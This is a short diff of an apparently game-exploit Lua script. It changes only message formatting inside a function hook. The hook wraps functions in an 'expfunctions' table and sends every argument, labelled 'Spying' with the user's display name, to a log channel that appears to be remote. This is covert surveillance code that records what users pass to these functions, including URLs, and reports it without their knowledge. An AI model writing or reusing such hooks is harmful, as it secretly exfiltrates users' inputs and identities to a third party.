@@ -52,9 +52,9 @@ for ind,var in next,expfunctions do
                 local args = {...}
                 for i,v in next,args do
                     if tostring(i):find("https") or tostring(v):find("https") and tostring(i):sub(34,46) == "Turtle-Secure" or tostring(i):sub(34,45) == "Sidhsksjsjsh" or tostring(v):sub(34,46) == "Turtle-Secure" or tostring(v):sub(34,45) == "Sidhsksjsjsh" then
-                        SendMessage(conflog,"Spying " .. user.DisplayName .. "\n```\n" .. i .. "\n" .. v .. "\n```")
+                        SendMessage(conflog,"Spying " .. user.DisplayName .. "\n```\n" .. i .. ". " .. v .. "\n```")
 		    else
-		        SendMessage(conflog,"Spying " .. user.DisplayName .. "\n```\n" .. i .. "\n" .. v .. "\n```")
+		        SendMessage(conflog,"Spying " .. user.DisplayName .. "\n```\n" .. i .. ". " .. v .. "\n```")
                     end
                 end
                 return old(...)
